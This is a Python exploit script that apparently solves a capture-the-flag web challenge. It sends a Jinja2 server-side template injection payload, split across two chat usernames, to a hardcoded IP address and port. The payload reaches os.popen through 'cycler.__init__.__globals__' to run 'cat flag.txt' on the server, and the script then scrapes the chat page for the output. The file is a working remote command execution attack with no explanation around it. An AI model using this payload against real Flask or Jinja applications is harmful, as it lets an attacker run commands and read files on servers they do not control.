
import sys
import requests
from bs4 import BeautifulSoup
import re

message = "dummy"

username1 = "{{cycler.__init__.__globals__.os.popen('cat flag.txt"
username2 = "'[:12]).read()}}"

usernames = [username1, username2]

base_url = "http://34.44.129.8:52162"


def set_username(session, base_url, username):
    resp = session.post(f"{base_url}/set_username", data={"username": username})
    print("Username set successfully.")

def send_message(session, base_url, message):
    resp = session.post(f"{base_url}/send_message", data={"message": message})
    print("Message sent successfully.")

def get_flag(session, base_url):
    resp = session.get(f"{base_url}/")
    soup = BeautifulSoup(resp.text, "html.parser")
    chat_box = soup.find(id="chat-box")
    if chat_box:
        html = chat_box.decode_contents()
        lines = re.split(r'<br\s*/?>', html)
        if lines:
            last = lines[-1].strip()
            return last.split(':')[0].strip()
        return None
    return None

def main():
    for username in usernames:
        session = requests.Session()
        set_username(session, base_url, username)
        send_message(session, base_url, message)
        if usernames.index(username) == len(usernames) - 1:
            chat_box_content = get_flag(session, base_url)
            print(chat_box_content)


main()
